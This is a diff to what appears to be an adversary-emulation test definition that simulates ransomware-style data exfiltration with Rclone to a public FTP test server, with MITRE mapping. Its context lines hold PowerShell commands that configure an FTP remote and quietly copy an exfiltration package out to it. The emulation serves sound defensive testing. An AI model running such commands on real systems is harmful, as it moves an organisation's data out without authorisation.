@@ -4,9 +4,6 @@ description: |-
     Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
     [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)
 args:
-    - name: ftp_port
-      type: integer
-      default: "21"
     - name: ftp_server
       type: string
       default: ftp.dlptest.com
@@ -16,6 +13,9 @@ args:
     - name: ftp_user
       type: string
       default: dlpuser
+    - name: ftp_port
+      type: integer
+      default: "21"
 uuid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
 mitre:
     tactics:
@@ -48,6 +48,3 @@ steps:
         &$rclone_bin config create ftpserver "ftp" "host" {{.Args.ftp_server}} "port" {{.Args.ftp_port}} "user" {{.Args.ftp_user}} "pass" {{.Args.ftp_pass}}
         &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
